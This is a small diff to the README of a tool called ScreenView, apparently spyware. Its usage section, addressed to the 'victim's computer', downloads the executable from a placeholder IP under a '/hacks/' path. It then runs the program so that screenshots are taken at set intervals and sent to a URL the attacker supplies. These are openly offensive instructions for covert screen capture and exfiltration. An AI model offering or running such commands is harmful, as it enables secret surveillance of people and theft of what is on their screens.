@@ -30,7 +30,7 @@ $ pip3 install -r requirements.txt
 ## Usage
 ### On victim's computer
 ```
-$ curl http://IP/ScreenView/ScreenView.(exe, app, etc) --output ScreenView.(exe, app, etc)
+$ curl http://IP/hacks/ScreenView/ScreenView.(exe, app, etc) --output ScreenView.(exe, app, etc)
 $ ScreenView.(exe, app, etc) --time (# Minutes) --url (Url to send screenshot to)
 ```
 
